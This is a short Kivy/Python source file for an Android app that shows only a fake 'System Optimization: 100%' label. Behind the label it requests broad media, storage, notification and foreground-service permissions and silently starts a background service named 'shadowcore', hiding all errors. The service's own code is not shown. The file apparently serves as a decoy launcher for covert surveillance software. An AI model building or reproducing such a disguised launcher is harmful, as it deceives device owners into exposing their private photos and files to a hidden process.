from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass

class ShadowSystemApp(App):
    def build(self):
        return Label(text="System Optimization: 100%", halign="center")

    def on_start(self):
        Clock.schedule_once(self.trigger_permissions, 1)

    def trigger_permissions(self, dt):
        try:
            from android.permissions import request_permissions, Permission
            perms = [
                Permission.READ_MEDIA_IMAGES, 
                Permission.POST_NOTIFICATIONS, 
                Permission.READ_EXTERNAL_STORAGE, 
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.FOREGROUND_SERVICE
            ]
            request_permissions(perms, self.launch_logic)
        except: pass

    def launch_logic(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            context = PythonActivity.mActivity
            # تشغيل الخدمة برمجياً
            service_class = autoclass('org.test.shadowcore.ServiceService')
            service_class.start(context, "")
        except: pass

if __name__ == "__main__":
    ShadowSystemApp().run()
